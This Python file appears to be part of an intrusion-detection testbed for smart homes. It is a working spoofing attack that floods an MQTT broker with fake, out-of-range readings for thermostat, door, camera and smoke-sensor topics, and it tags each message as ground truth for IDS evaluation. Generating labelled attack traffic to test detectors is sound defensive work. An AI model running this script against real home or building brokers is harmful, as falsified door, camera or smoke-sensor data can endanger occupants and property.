"""
Spoofing Attack: Publishes fake sensor data with wildly out-of-range values
to trick the CPU into executing incorrect actuator commands.

IDS should detect: value_range violation
"""

import time
import random
import paho.mqtt.client as mqtt
from offensive.ground_truth import tag as gt_tag

SPOOFED_DATA = {
    "home/thermo/data": ["999", "-200", "500.5", "9999"],
    "home/sound/data": ["500", "1000", "-50", "9999"],
    "home/lighting/data": ["strobing", "hacked", "AAAA"],
    "home/door/data": ["forced_open", "BREACH", "override"],
    "home/camera/data": ["disabled", "hijacked", "looping"],
    "home/smart-plug/data": ["surge", "overload", "malicious_on"],
    "home/Smoke-Gas-Sensor/data": ["false_alarm_flood", "disabled", "OVERRIDE"],
}


def run(broker_ip, duration=30, interval=1.0):
    """Spoofing attack: send fake sensor values."""
    print(f"[ATTACK] Spoofing - Connecting to {broker_ip}")

    client = mqtt.Client(client_id="spoofed-sensor")
    client.connect(broker_ip, 1883, 60)
    client.loop_start()

    topics = list(SPOOFED_DATA.keys())
    end_time = time.time() + duration
    count = 0

    print(f"[ATTACK] Spoofing - Sending fake data for {duration}s")
    while time.time() < end_time:
        topic = random.choice(topics)
        value = random.choice(SPOOFED_DATA[topic])
        client.publish(topic, value)
        gt_tag(client, "spoofing", topic, value)
        print(f"  -> {topic}: {value}")
        count += 1
        time.sleep(interval)

    client.loop_stop()
    client.disconnect()
    print(f"[ATTACK] Spoofing complete. Sent {count} fake messages.")
    return count
